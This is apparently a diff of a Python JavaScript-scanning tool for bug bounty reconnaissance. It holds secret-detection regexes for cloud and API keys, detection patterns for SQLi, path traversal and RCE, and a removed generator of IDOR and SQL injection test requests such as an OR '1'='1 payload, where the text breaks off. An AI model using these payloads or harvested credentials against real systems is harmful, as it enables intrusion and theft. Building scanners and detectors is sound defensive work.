+            params = re.findall(r'(\w+)=', qs)
+            add(path, params, "GET", line_of(m.start()), ctx_at(m.start()))
+
+    # ── Pattern 6: URL constructor — new URL("/path/".concat(...)) ────────
+    for m in re.finditer(
+        r'new\s+URL\s*\(\s*["\']([^"\']{3,80})["\']',
+        content, re.IGNORECASE
+    ):
+        ep = m.group(1)
+        add(ep, [], "GET", line_of(m.start()), ctx_at(m.start()))
+
+    # ── Pattern 7: string path + concat/variable ─────────────────────────
+    for m in re.finditer(
+        r'["\'](\/?(?:api|v\d+|admin|rest|graphql|internal|backend)[\/\w\-\.]+)["\']',
+        content, re.IGNORECASE
+    ):
+        ep = m.group(1)
+        # only if it looks like a real API path
+        if ep.count("/") >= 2 or re.search(r'/v\d+/', ep):
+            add(ep, [], "GET", line_of(m.start()), ctx_at(m.start()))
+
+    # ── Pattern 8: route definitions ─────────────────────────────────────
+    for m in re.finditer(
+        r'(?:path|route)\s*:\s*["\']([^"\']{2,80})["\']',
+        content, re.IGNORECASE
+    ):
+        ep = m.group(1)
+        params = re.findall(r':(\w+)', ep)
+        if ep.startswith("/"):
+            add(ep, params, "GET", line_of(m.start()), ctx_at(m.start()))
+
+    # ── Pattern 9: URLSearchParams / FormData ────────────────────────────
+    for m in re.finditer(
+        r'(?:searchParams|formData|params|data)\.(?:append|set)\s*\(\s*["\'](\w+)["\']',
+        content, re.IGNORECASE
+    ):
+        param_name = m.group(1)
+        # find nearby URL
+        nearby = content[max(0, m.start()-200):m.start()]
+        um = re.search(r'["\']([/?][^"\']{2,60})["\']', nearby)
+        ep = um.group(1) if um else "(unknown)"
+        add(ep, [param_name], "POST", line_of(m.start()), ctx_at(m.start()))
+
+    return found
 
 
-def is_syntax_token(match_text, context_line):
+def find_sqli_indicators(content, base_url):
     """
-    ACE editor, CodeMirror, and similar tools define syntax tokens like:
-    token:"keyword.operator.xml" or token:"entity.other.attribute-name.xml"
-    These look like our token: patterns but are just grammar definitions.
-    """
-    # syntax token patterns from code editors
-    if re.search(r'token\s*[=:]\s*["\'][\w.]+(?:\.\w+){2,}["\']', match_text):
-        return True
-    # dot-notation strings (grammar definitions never used as real tokens)
-    value_match = re.search(r'[=:]\s*["\']([^"\']+)["\']', match_text)
-    if value_match:
-        val = value_match.group(1)
-        # grammar definition: contains 3+ dot-separated lowercase words
-        parts = val.split('.')
-        if len(parts) >= 3 and all(p.islower() and p.isalpha() for p in parts[:3]):
-            return True
-    return False
-
-
-# ─── Tighter broad-pass patterns ──────────────────────────────────────────────
-# Every pattern here requires REAL credential context, not just any long string.
-# Removed: generic hex strings, generic token: matches, generic long strings.
-# Kept: patterns with near-zero false positive rate.
-
-FN_BROAD_PATTERNS = [
-    # key/token/secret/password VARIABLE assigned a RANDOM-LOOKING string (32+ chars)
-    # The value must contain mixed case AND digits — rules out grammar strings
-    (r'(?:api_?key|api_?token|secret_?key|access_?token|auth_?token|private_?key|client_?secret)'
-     r'\s*[=:]\s*["\']([A-Za-z0-9_\-\.+/]{32,})["\']',
-     "high", "Specific credential variable assigned long random-looking value"),
-
-    # Authorization header with actual token value inline
-    (r'["\']Authorization["\']?\s*[,:]\s*["\']?(Bearer|Basic|Token)\s+([A-Za-z0-9_\-\.+/=]{20,})',
-     "high", "Authorization header with hardcoded token value"),
-
-    # URL with credentials embedded (user:pass@host) — always real
-    (r'https?://[A-Za-z0-9_\-\.]+:[A-Za-z0-9_\-\.!@#$%^&*]{6,}@[A-Za-z0-9\-\.]+',
-     "critical", "URL with embedded credentials (user:pass@host format)"),
-
-    # PEM private key block — always real, zero false positives
-    (r'-----BEGIN\s+(?:RSA\s+|EC\s+|OPENSSH\s+)?PRIVATE KEY-----',
-     "critical", "PEM private key block found in JS"),
-
-    # JWT: must start with eyJ (base64 JSON header) — format is very specific
-    (r'eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}',
-     "high", "JWT token — three-part base64 structure starting with eyJ"),
-
-    # Google Cloud service account JSON
-    (r'"type"\s*:\s*"service_account"',
-     "critical", "Google Cloud service account JSON key"),
-
-    # Slack webhook — very specific URL format, near-zero FP
-    (r'https://hooks\.slack\.com/services/T[A-Z0-9]{8,}/B[A-Z0-9]{8,}/[A-Za-z0-9]{20,}',
-     "high", "Slack webhook URL with real token structure"),
-
-    # GitHub tokens — very specific prefix format
-    (r'gh[pousr]_[A-Za-z0-9]{36,}',
-     "critical", "GitHub personal access token (ghp_/gho_/ghu_/ghs_/ghr_ prefix)"),
-
-    # NPM token — very specific format
-    (r'npm_[A-Za-z0-9]{36,}',
-     "high", "NPM access token"),
-
-    # Hardcoded Basic auth header value
-    (r'Basic\s+[A-Za-z0-9+/]{20,}={0,2}(?=["\'\s,;])',
-     "high", "Hardcoded Basic auth value (base64 encoded credentials)"),
-]
-
-
-def run_false_negative_pass(content, lines, already_found_hashes,
-                             source_domain="", source_url=""):
-    """
-    Second analysis pass — tighter patterns for real missed credentials.
-    Skips library files. Filters syntax tokens and hex data tables.
-    Only returns confirmed or likely findings.
-    """
-    fn_findings = []
-
-    # skip vendor/library files entirely — they always look suspicious
-    is_lib, lib_reason = is_library_file(source_url, content[:2000])
-    if is_lib:
-        return []
-
-    for pattern, severity, description in FN_BROAD_PATTERNS:
-        try:
-            for match in re.finditer(pattern, content, re.IGNORECASE | re.MULTILINE):
-                matched_str = match.group(0)[:120]
-                line_num    = content[:match.start()].count("\n") + 1
-                line_ctx    = lines[line_num-1].strip()[:150] if line_num <= len(lines) else ""
-
-                # skip if main pass already caught this
-                dedup_key = hashlib.md5(f"fn_pass{matched_str}".encode()).hexdigest()
-                if dedup_key in already_found_hashes:
-                    continue
-                already_found_hashes.add(dedup_key)
-
-                # run through confidence engine
-                conf = assess_finding_confidence(
-                    matched_str, line_ctx, "Broad Pattern", severity, source_domain
-                )
-
-                # only keep if confidence is at least 'possible'
-                if conf["confidence"] == "filtered":
-                    continue
-
-                fn_findings.append({
-                    "category":          "Additional Findings (Broad Pass)",
-                    "severity":          conf["adjusted_severity"],
-                    "match":             matched_str,
-                    "line":              line_num,
-                    "context":           line_ctx,
-                    "source_domain":     source_domain,
-                    "fn_description":    description,
-                    "confidence":        conf["confidence"],
-                    "confidence_score":  conf["confidence_score"],
-                })
-
-        except re.error:
-            continue
-
-    return fn_findings
-
-
-
-
-# ═════════════════════════════════════════════════════════════════════════════
-#  JS INTELLIGENCE ENGINE
-#
-#  This is what separates JSReaper from all other tools.
-#  Instead of just pattern-matching, this engine READS the JS like a human:
-#
-#  1. URL CONSTRUCTOR DETECTION — finds functions that build API URLs
-#     (like the /admin/v2/ constructor DeepSeek found) and extracts
-#     every endpoint pattern the app uses
-#
-#  2. VULNERABILITY-SPECIFIC PAYLOAD GENERATION — for each endpoint found,
-#     generates ready-to-use curl/URL test cases for IDOR, SQLi, XSS,
-#     SSRF, path traversal, auth bypass, mass assignment, etc.
-#
-#  3. SOURCE MAP DETECTION — flags .map files that expose full source code
-#
-#  4. DEPRECATED FUNCTION DETECTION — finds old/dead code that still runs
-#
-#  5. BUG BOUNTY REPORT GENERATOR — produces a formatted, submittable
-#     report section for each confirmed finding
-#
-#  6. SECRETFINDER + LINKFINDER PATTERNS — integrated from the best
-#     open source tools, extended with newer services
-# ═════════════════════════════════════════════════════════════════════════════
-
-# ── SecretFinder + TruffleHog + extended patterns ────────────────────────────
-# Sourced from: SecretFinder (m4ll0k), TruffleHog (trufflesecurity),
-# and extended with newer services not in those tools.
-# Each pattern has near-zero false positive rate — format-specific matches only.
-
-PRECISION_SECRET_PATTERNS = {
-
-    # Google — very specific formats, almost never FP
-    "Google API Key":         (r'AIza[0-9A-Za-z\-_]{35}',                         "critical"),
-    "Google OAuth Token":     (r'ya29\.[0-9A-Za-z\-_]+',                           "critical"),
-    "Google Captcha Key":     (r'6L[0-9A-Za-z\-_]{38}',                            "high"),
-    "Google Cloud Service":   (r'"type"\s*:\s*"service_account"',                 "critical"),
-
-    # AWS — AKIA prefix is unique in the world
-    "AWS Access Key":         (r'(?:A3T[A-Z0-9]|AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}', "critical"),
-    "AWS MWS Token":          (r'amzn\.mws\.[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}', "critical"),
-
-    # Stripe — live vs test (live = critical, test = low)
-    "Stripe Live Secret":     (r'sk_live_[0-9a-zA-Z]{24,}',                        "critical"),
-    "Stripe Live Public":     (r'pk_live_[0-9a-zA-Z]{24,}',                        "high"),
-    "Stripe Restricted":      (r'rk_live_[0-9a-zA-Z]{24,}',                        "critical"),
-    "Stripe Test Key":        (r'sk_test_[0-9a-zA-Z]{24,}',                        "low"),
-
-    # PayPal / Braintree
-    "Braintree Token":        (r'access_token\$production\$[0-9a-z]{16}\$[0-9a-f]{32}', "critical"),
-    "Square OAuth":           (r'sq0csp-[0-9A-Za-z\-_]{43}',                      "critical"),
-    "Square Access Token":    (r'sqOatp-[0-9A-Za-z\-_]{22}',                      "high"),
-
-    # Twilio — very specific format
-    "Twilio API Key":         (r'SK[0-9a-fA-F]{32}',                               "high"),
-    "Twilio Account SID":     (r'AC[a-zA-Z0-9_\-]{32}',                           "high"),
-    "Twilio App SID":         (r'AP[a-zA-Z0-9_\-]{32}',                           "medium"),
-
-    # SendGrid
-    "SendGrid Key":           (r'SG\.[a-zA-Z0-9_\-]{22}\.[a-zA-Z0-9_\-]{43}', "critical"),
-
-    # GitHub
-    "GitHub PAT (classic)":   (r'ghp_[A-Za-z0-9]{36,}',                            "critical"),
-    "GitHub OAuth":           (r'gho_[A-Za-z0-9]{36,}',                            "critical"),
-    "GitHub App Token":       (r'(ghu|ghs|ghr)_[A-Za-z0-9]{36,}',                 "critical"),
-    "GitHub Fine-Grained":    (r'github_pat_[A-Za-z0-9_]{82,}',                    "critical"),
-
-    # Slack
-    "Slack Token":            (r'xox[baprs]-[0-9A-Za-z\-]{10,}',                  "critical"),
-    "Slack Webhook":          (r'https://hooks\.slack\.com/services/T[A-Z0-9]{8,}/B[A-Z0-9]{8,}/[A-Za-z0-9]{20,}', "critical"),
-    "Slack Signing Secret":   (r'[0-9a-f]{32}',                                    "info"),  # too generic alone
-
-    # Facebook
-    "Facebook Token":         (r'EAACEdEose0cBA[0-9A-Za-z]+',                      "critical"),
-    "Facebook App Secret":    (r'(?:facebook|fb)[_\-]?(?:app)?[_\-]?secret[\s]*[=:][\s]*["\'"]([0-9a-f]{32})["\'"]', "critical"),
-
-    # Twitter/X
-    "Twitter Bearer":         (r'AAAAAAAAAAAAAAAAAAAAAA[A-Za-z0-9%]{20,}',         "high"),
-    "Twitter API Key":        (r'twitter[_\-]?(?:api)?[_\-]?(?:key|secret)[\s]*[=:][\s]*["\'"]([A-Za-z0-9]{25,})["\'"]', "high"),
-
-    # Mailgun
-    "Mailgun Key":            (r'key-[0-9a-zA-Z]{32}',                             "critical"),
-
-    # Heroku
-    "Heroku Key":             (r'[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}', "medium"),  # UUID-like, needs context
-
-    # NPM
-    "NPM Token":              (r'npm_[A-Za-z0-9]{36,}',                            "critical"),
-
-    # JWT — very specific 3-part base64 format
-    "JWT Token":              (r'ey[A-Za-z0-9_-]{10,}\.[A-Za-z0-9._-]{10,}\.[A-Za-z0-9_-]{10,}', "high"),
-
-    # Private keys — format is unique
-    "RSA Private Key":        (r'-----BEGIN RSA PRIVATE KEY-----',                  "critical"),
-    "EC Private Key":         (r'-----BEGIN EC PRIVATE KEY-----',                   "critical"),
-    "OpenSSH Private Key":    (r'-----BEGIN OPENSSH PRIVATE KEY-----',              "critical"),
-    "PGP Private Block":      (r'-----BEGIN PGP PRIVATE KEY BLOCK-----',            "critical"),
-    "DSA Private Key":        (r'-----BEGIN DSA PRIVATE KEY-----',                  "critical"),
-
-    # Auth headers inline
-    "Bearer Token Inline":    (r'[Aa]uthorization["\'"]?\s*:\s*["\'"]?Bearer\s+([A-Za-z0-9_\-\.=]{20,})', "high"),
-    "Basic Auth Inline":      (r'[Aa]uthorization["\'"]?\s*:\s*["\'"]?Basic\s+([A-Za-z0-9+/=]{20,})', "high"),
-
-    # URL with embedded credentials
-    "URL Credentials":        (r'https?://[A-Za-z0-9_\-\.]+:[A-Za-z0-9_\-\.!@#$%^&*]{6,}@[A-Za-z0-9\-\.]+', "critical"),
-
-    # Shopify
-    "Shopify Token":          (r'shpat_[A-Za-z0-9]{32}',                           "critical"),
-    "Shopify Partner Token":  (r'shppa_[A-Za-z0-9]{32}',                           "critical"),
-
-    # Anthropic / OpenAI / AI services
-    "OpenAI Key":             (r'sk-[A-Za-z0-9]{48,}',                             "critical"),
-    "Anthropic Key":          (r'sk-ant-[A-Za-z0-9_\-]{93,}',                     "critical"),
-
-    # Cloudflare
-    "Cloudflare Global Key":  (r'[0-9a-f]{37}',                                    "info"),   # too generic, needs context
-    "Cloudflare Token":       (r'cloudflare[_\-]?(?:api)?[_\-]?token[\s]*[=:][\s]*["\'"]([A-Za-z0-9_\-]{40,})["\'"]', "high"),
-
-    # Firebase
-    "Firebase Config":        (r'firebaseConfig\s*=\s*\{[^}]+\}',              "high"),
-    "Firebase DB URL":        (r'https://[a-z0-9-]+\.firebaseio\.com',           "medium"),
-    "Firebase Storage":       (r'https://[a-z0-9-]+\.appspot\.com',              "info"),
-
-    # Mapbox
-    "Mapbox Token":           (r'pk\.[a-zA-Z0-9_\-]{60,}\.[a-zA-Z0-9_\-]{20,}', "high"),
-
-    # Datadog
-    "Datadog API Key":        (r'datadog[_\-]?(?:api)?[_\-]?key[\s]*[=:][\s]*["\'"]([a-f0-9]{32})["\'"]', "high"),
-
-    # Algolia
-    "Algolia API Key":        (r'[Aa]lgolia[_\-]?(?:api)?[_\-]?key[\s]*[=:][\s]*["\'"]([A-Za-z0-9]{32})["\'"]', "high"),
-
-    # Zendesk
-    "Zendesk Token":          (r'[Zz]endesk[_\-]?(?:api)?[_\-]?token[\s]*[=:][\s]*["\'"]([A-Za-z0-9]{40,})["\'"]', "high"),
-
-    # Source maps — information disclosure
-    "Source Map Exposed":     (r'//[#@]\s*sourceMappingURL=\S+\.map',           "medium"),
-}
-
-
-# ── URL constructor patterns ───────────────────────────────────────────────────
-# These detect code that BUILDS API URLs dynamically.
-# Finding the constructor = finding ALL the app's endpoints.
-
-URL_CONSTRUCTOR_PATTERNS = [
-    # new URL("/admin/v2/".concat(e), n)
-    r'new\s+URL\s*\(\s*["\'][^"\']{2,60}["\']\s*\.concat\(',
-    # "/api/v1/" + resource
-    r'["\'](\/(?:api|admin|v\d+|internal|rest|graphql|backend)[/\w]*)["\']\s*\+\s*\w',
-    # template literals: `/api/v2/${resource}`
-    r'`(\/(?:api|admin|v\d+|internal|rest|graphql)[/\w]*\/\$\{[^}]+\}[^`]*)`',
-    # path/url variable assignment
-    r'(?:path|url|endpoint|baseUrl|BASE_URL)\s*[=+]\s*["\'](\/(?:api|admin|v\d+)[/\w]+)["\']\s*',
-    # Express/Koa route definitions
-    r'(?:router|app)\s*\.(?:get|post|put|delete|patch)\s*\(\s*["\']([^"\']{2,80})["\']\s*',
-    # fetch/axios base patterns
-    r'(?:fetch|axios\.(?:get|post|put|delete|patch))\s*\(\s*["\']([/][^"\']{2,80})["\']\s*',
-]
-
-
-# ── Vulnerability indicator patterns ─────────────────────────────────────────
-# These detect CODE PATTERNS that suggest a specific vuln class.
-# Different from the finding patterns — these look at HOW data flows.
-
-VULN_INDICATOR_PATTERNS = {
-    "IDOR": [
-        r'(?:get|fetch|load)\w*\s*\(\s*(?:id|user_?id|device_?id|item_?id)\s*\)',
-        r'/\w+/\$?\{?\w*[Ii][Dd]\w*\}?',
-        r'params\s*\[\s*["\']id["\']',
-        r'\.id\b.*(?:delete|remove|update|edit|modify)',
-    ],
-    "SQLi": [
-        r'["\']SELECT\s.+FROM\s["\']?\s*\+',
-        r'WHERE\s+\w+\s*=\s*["\']?\s*\+\s*(?:req|param|input|user)',
-        r'\.query\s*\(\s*`[^`]*\$\{(?!__)',
-        r'(?:order|sort)\s*[=:]\s*(?:req|param|query)\.',
-    ],
-    "XSS": [
-        r'innerHTML\s*=\s*[^"\'][^;]{0,80}(?:search|query|param|input|hash|location)',
-        r'document\.write\s*\([^)]*(?:search|query|param|input)',
-        r'\.dangerouslySetInnerHTML\s*=\s*\{',
-        r'(?:search|query|hash|param)\s*\+\s*[^;]+innerHTML',
-    ],
-    "OpenRedirect": [
-        r'(?:redirect|location)\s*[=:]\s*(?:req|param|query|input)',
-        r'window\.location\s*=\s*(?:req|param|query|url|next|redirect)',
-        r'["\']redirect["\'].*\+.*(?:req|param|query)',
-    ],
-    "SSRF": [
-        r'(?:fetch|axios|http\.get|request)\s*\(\s*(?:req|param|query|input|url)\.',
-        r'(?:webhook|callback|proxy|forward)\s*[=:]\s*(?:req|param|input)',
-        r'new\s+URL\s*\(\s*(?:req|param|input|query)\.',
-    ],
-    "PathTraversal": [
-        r'(?:readFile|readFileSync|createReadStream)\s*\(\s*(?:req|param|query|input)',
-        r'path\.(?:join|resolve)\s*\([^)]*(?:req|param|query|input)',
-        r'(?:__dirname|__filename)\s*\+\s*(?:req|param|query)',
-    ],
-    "MassAssignment": [
-        r'Object\.assign\s*\(\s*\w+\s*,\s*(?:req\.body|req\.query|params)',
-        r'\.\.\.\s*(?:req\.body|req\.query|params)\b',
-        r'update\s*\(\s*(?:req\.body|req\.query|params)\s*\)',
-    ],
-    "DeprecatedCode": [
-        r'deprecated|@deprecated|obsolete|legacy|DO_NOT_USE',
-        r'TODO.*(?:remove|delete|fix|hack|security|auth)',
-        r'FIXME.*(?:security|auth|injection|xss|csrf)',
-    ],
-}
-
-
-
-def run_precision_secret_scan(content, source_url="", source_domain=""):
-    """
-    Run the high-precision secret patterns (SecretFinder/TruffleHog style).
-    These patterns have near-zero false positives — format is highly specific.
-    Returns list of findings with service name, severity, and match.
+    Find SQL injection indicators in JS.
+    Only flags code where user-controlled data flows into a SQL query.
+    A SELECT statement alone is NOT a finding — it needs + concatenation or
+    template literal injection to be meaningful.
     """
     findings = []
-    seen     = set()
     lines    = content.split("\n")
+    seen     = set()
 
-    for service, (pattern, severity) in PRECISION_SECRET_PATTERNS.items():
+    # user-controlled input sources we look for near SQL keywords
+    USER_INPUT = r'(?:req\.|request\.|params\.|query\.|body\.|input|search|filter|order|sort|user)'
+
+    patterns = [
+        # Template literal with user input in SQL context
+        (r'\.query\s*\(\s*`[^`]{0,60}\$\{[^}]*' + USER_INPUT,
+         "SQL query using template literal with user-controlled input — classic SQLi vector",
+         "critical"),
+
+        # String concatenation building a SQL query
+        (r'(?:SELECT|INSERT|UPDATE|DELETE|WHERE|FROM)\s[^;"\n]{0,50}\+\s*' + USER_INPUT,
+         "SQL keyword with string concatenation and user input — SQLi indicator",
+         "critical"),
+
+        # execute() or query() called with concatenated user input
+        (r'(?:execute|query)\s*\(\s*["\'][^"\']*["\'\s]*\+\s*' + USER_INPUT,
+         "SQL execute/query with string concatenation from user input",
+         "high"),
+
+        # ORDER BY parameter directly from user input (common SQLi)
+        (r'(?:order|sort|orderby|order_by)\s*[=:]\s*' + USER_INPUT,
+         "ORDER BY/sort parameter comes from user input — SQL injection risk",
+         "high"),
+
+        # LIKE clause with user input
+        (r'LIKE\s+["\']%["\']?\s*\+\s*' + USER_INPUT,
+         "SQL LIKE clause with user-controlled input",
+         "high"),
+    ]
+
+    for pattern, description, severity in patterns:
         try:
-            for match in re.finditer(pattern, content, re.IGNORECASE | re.MULTILINE):
-                matched = match.group(0)[:120]
-                line_num = content[:match.start()].count("\n") + 1
+            for m in re.finditer(pattern, content, re.IGNORECASE | re.MULTILINE):
+                matched = m.group(0)[:150]
+                line_num = content[:m.start()].count("\n") + 1
                 line_ctx = lines[line_num-1].strip()[:150] if line_num <= len(lines) else ""
-
-                # deduplicate
-                key = hashlib.md5(f"{service}{matched}".encode()).hexdigest()
+                key = hashlib.md5(matched.encode()).hexdigest()
                 if key in seen:
                     continue
                 seen.add(key)
-
-                # run confidence check
-                conf = assess_finding_confidence(matched, line_ctx, service, severity, source_domain)
-                if conf["confidence"] == "filtered":
-                    continue
-
                 findings.append({
-                    "service":          service,
-                    "category":         "Precision Secret Scan",
-                    "severity":         conf["adjusted_severity"],
-                    "match":            matched,
-                    "line":             line_num,
-                    "context":          line_ctx,
-                    "confidence":       conf["confidence"],
-                    "confidence_score": conf["confidence_score"],
-                    "source_file":      source_url,
-                    "source_domain":    source_domain,
+                    "type":        "SQL Injection",
+                    "severity":    severity,
+                    "description": description,
+                    "match":       matched,
+                    "line":        line_num,
+                    "context":     line_ctx,
                 })
         except re.error:
             continue
@@ -1646,2374 +493,932 @@ def run_precision_secret_scan(content, source_url="", source_domain=""):
     return findings
 
 
-def detect_url_constructors(content, source_url="", base_domain=""):
+def find_path_traversal(content, base_url):
     """
-    Find functions in JS that build API URLs dynamically.
-    This is the key insight from DeepSeek's analysis — finding the URL
-    constructor tells you ALL the endpoints the app can talk to.
-
-    Returns list of discovered endpoint base patterns.
+    Find path traversal and LFI indicators in JS.
+    Only flags when user-controlled input reaches file system functions.
     """
-    discovered = []
-    seen       = set()
-    lines      = content.split("\n")
+    findings = []
+    lines    = content.split("\n")
+    seen     = set()
 
-    for pattern in URL_CONSTRUCTOR_PATTERNS:
+    USER_INPUT = r'(?:req\.|request\.|params\.|query\.|body\.|input|file|path|filename|template|page|include|load)'
+
+    patterns = [
+        # readFile with user input
+        (r'(?:readFile|readFileSync|createReadStream)\s*\([^)]{0,60}' + USER_INPUT,
+         "File read with user-controlled path — path traversal / LFI",
+         "critical"),
+
+        # path.join with user input
+        (r'path\.(?:join|resolve)\s*\([^)]{0,80}' + USER_INPUT,
+         "path.join() with user input — path traversal risk",
+         "high"),
+
+        # __dirname + user input
+        (r'(?:__dirname|__filename)\s*\+\s*(?:req\.|params\.|query\.|input)',
+         "__dirname concatenated with user input — path traversal",
+         "high"),
+
+        # sendFile or download with user input
+        (r'(?:sendFile|download|res\.download)\s*\([^)]{0,60}' + USER_INPUT,
+         "File send/download with user-controlled path",
+         "high"),
+
+        # require() with user input (also RCE risk)
+        (r'require\s*\(\s*(?:req\.|request\.|params\.|query\.|input)',
+         "Dynamic require() with user input — path traversal AND potential RCE",
+         "critical"),
+    ]
+
+    for pattern, description, severity in patterns:
         try:
-            for match in re.finditer(pattern, content, re.IGNORECASE | re.MULTILINE):
-                endpoint = match.group(1) if match.lastindex else match.group(0)
-                endpoint = endpoint.strip().strip("`'\"")
-
-                # normalize
-                if not endpoint.startswith("/") and not endpoint.startswith("http"):
-                    continue
-                if len(endpoint) < 3 or len(endpoint) > 120:
-                    continue
-
-                # remove template literal placeholders for display
-                clean = re.sub(r"\$\{[^}]+\}", "*", endpoint)
-
-                key = hashlib.md5(clean.encode()).hexdigest()
+            for m in re.finditer(pattern, content, re.IGNORECASE | re.MULTILINE):
+                matched  = m.group(0)[:150]
+                line_num = content[:m.start()].count("\n") + 1
+                line_ctx = lines[line_num-1].strip()[:150] if line_num <= len(lines) else ""
+                key = hashlib.md5(matched.encode()).hexdigest()
                 if key in seen:
                     continue
                 seen.add(key)
-
-                line_num = content[:match.start()].count("\n") + 1
-                line_ctx = lines[line_num-1].strip()[:200] if line_num <= len(lines) else ""
-
-                discovered.append({
-                    "endpoint":    clean,
-                    "raw":         endpoint,
+                findings.append({
+                    "type":        "Path Traversal / LFI",
+                    "severity":    severity,
+                    "description": description,
+                    "match":       matched,
                     "line":        line_num,
                     "context":     line_ctx,
-                    "source_file": source_url,
-                    "domain":      base_domain,
                 })
         except re.error:
             continue
 
-    return discovered
+    return findings
 
 
-def detect_vuln_indicators(content, source_url="", base_domain=""):
+def find_rce_indicators(content, base_url):
     """
-    Detect vulnerability class indicators in JS code.
-    These are code patterns that suggest a vuln EXISTS and is worth testing —
-    not confirmed findings, but strong leads.
-
-    Returns dict of vuln_class -> list of indicators.
+    Find Remote Code Execution indicators in JS.
+    Only flags eval/exec/spawn patterns where user input reaches them.
     """
-    indicators = {}
-    lines = content.split("\n")
+    findings = []
+    lines    = content.split("\n")
+    seen     = set()
 
-    for vuln_class, patterns in VULN_INDICATOR_PATTERNS.items():
-        hits = []
-        seen = set()
-        for pattern in patterns:
-            try:
-                for match in re.finditer(pattern, content, re.IGNORECASE | re.MULTILINE):
-                    matched  = match.group(0)[:100]
-                    line_num = content[:match.start()].count("\n") + 1
-                    line_ctx = lines[line_num-1].strip()[:150] if line_num <= len(lines) else ""
+    USER_INPUT = r'(?:req\.|request\.|params\.|query\.|body\.|input|user|cmd|command|exec)'
 
-                    key = hashlib.md5(f"{vuln_class}{matched}".encode()).hexdigest()
-                    if key in seen:
-                        continue
-                    seen.add(key)
+    patterns = [
+        # eval() with user input — the clearest RCE indicator
+        (r'eval\s*\(\s*(?:req\.|request\.|params\.|query\.|body\.|input|user)',
+         "eval() called with user-controlled input — direct RCE",
+         "critical"),
 
-                    hits.append({
-                        "match":       matched,
-                        "line":        line_num,
-                        "context":     line_ctx,
-                        "source_file": source_url,
-                    })
-            except re.error:
-                continue
+        # new Function() with user input
+        (r'new\s+Function\s*\([^)]{0,60}' + USER_INPUT,
+         "new Function() with user input — code injection / RCE",
+         "critical"),
 
-        if hits:
-            indicators[vuln_class] = hits
+        # child_process exec/spawn with user input
+        (r'(?:exec|execSync|spawn|spawnSync)\s*\([^)]{0,60}' + USER_INPUT,
+         "child_process exec/spawn with user-controlled command — OS command injection",
+         "critical"),
 
-    return indicators
+        # child_process imported at all (flag the import, lower severity)
+        (r'require\s*\(\s*["\']child_process["\']',
+         "child_process module imported — check if user input reaches exec/spawn",
+         "medium"),
+
+        # vm.runInNewContext or similar Node.js sandbox escapes
+        (r'vm\s*\.\s*(?:runInNewContext|runInThisContext|Script)',
+         "vm module usage — potential sandbox escape if user input reaches it",
+         "medium"),
+
+        # setTimeout/setInterval with string (eval-like)
+        (r'(?:setTimeout|setInterval)\s*\(\s*(?:req\.|params\.|query\.|input)',
+         "setTimeout/setInterval with user input string — eval-equivalent RCE",
+         "high"),
+    ]
+
+    for pattern, description, severity in patterns:
+        try:
+            for m in re.finditer(pattern, content, re.IGNORECASE | re.MULTILINE):
+                matched  = m.group(0)[:150]
+                line_num = content[:m.start()].count("\n") + 1
+                line_ctx = lines[line_num-1].strip()[:150] if line_num <= len(lines) else ""
+                key = hashlib.md5(matched.encode()).hexdigest()
+                if key in seen:
+                    continue
+                seen.add(key)
+                findings.append({
+                    "type":        "RCE Indicator",
+                    "severity":    severity,
+                    "description": description,
+                    "match":       matched,
+                    "line":        line_num,
+                    "context":     line_ctx,
+                })
+        except re.error:
+            continue
+
+    return findings
 
 
-def generate_test_payloads(base_url, endpoints, vuln_indicators, source_maps=None):
+def find_info_disclosure(content, base_url):
     """
-    The DeepSeek feature — given discovered endpoints and vulnerability
-    indicators, generate concrete, ready-to-use test cases.
-
-    This is what turns reconnaissance into actionable findings.
-    Returns a structured list of test cases grouped by vulnerability class.
+    Find genuine information disclosure — credentials, keys, tokens
+    with specific formats that cannot be false positives.
+    Only patterns where the FORMAT itself is proof of authenticity.
     """
-    test_cases = []
-    domain = base_url.rstrip("/")
+    findings = []
+    lines    = content.split("\n")
+    seen     = set()
 
-    # ── build endpoint list ───────────────────────────────────────────────
-    ep_list = []
-    for ep in endpoints:
-        path = ep["endpoint"]
-        # if it's a base pattern, generate common suffixes
-        if path.endswith("/") or path.endswith("*") or path.count("/") <= 2:
-            ep_list.append(path)
-            # add common sub-resources
-            for suffix in ["users", "devices", "admin", "profiles", "settings",
-                           "reports", "logs", "api_keys", "webhooks", "export",
-                           "upload", "import", "search", "bulk_action"]:
-                ep_list.append(path.rstrip("*").rstrip("/") + "/" + suffix)
-        else:
-            ep_list.append(path)
+    patterns = [
+        # AWS — AKIA prefix is globally unique
+        (r'(?:A3T[A-Z0-9]|AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}',
+         "AWS Access Key ID — unique format, near-zero false positives", "critical"),
 
-    ep_list = list(dict.fromkeys(ep_list))[:30]  # dedupe, cap at 30
+        # AWS secret — variable name + 40-char base64
+        (r'aws[_\-]?secret[_\-]?(?:access[_\-]?)?key\s*[=:]\s*["\']([A-Za-z0-9/+=]{40})["\']',
+         "AWS Secret Access Key", "critical"),
 
-    # ── IDOR test cases ───────────────────────────────────────────────────
-    if "IDOR" in vuln_indicators or any("id" in e.lower() for e in ep_list):
-        idor_cases = []
-        for ep in ep_list[:10]:
-            full = domain + ep if ep.startswith("/") else domain + "/" + ep
-            idor_cases.extend([
-                f"GET  {full}/1",
-                f"GET  {full}/2",
-                f"GET  {full}/9999",
-                f"GET  {full}?id=1",
-                f"GET  {full}?user_id=1&user_id=2",
-            ])
-        test_cases.append({
-            "vuln_class":  "IDOR / BOLA",
-            "severity":    "high",
-            "description": "Direct object references found. Test if you can access resources belonging to other users by changing ID values.",
-            "tests":       idor_cases[:15],
-            "tip":         "Try IDs 1-10 first. A 200 response when you shouldn\'t have access = IDOR. Compare responses between your account and other IDs.",
-        })
+        # Stripe live secret — sk_live_ prefix
+        (r'sk_live_[0-9a-zA-Z]{24,}',
+         "Stripe Live Secret Key — active payment credential", "critical"),
 
-    # ── SQLi test cases ───────────────────────────────────────────────────
-    if "SQLi" in vuln_indicators:
-        sqli_cases = []
-        for ep in ep_list[:5]:
-            full = domain + ep if ep.startswith("/") else domain + "/" + ep
-            sqli_cases.extend([
-                f"GET  {full}?order=id\' OR \'1\'=\'1",
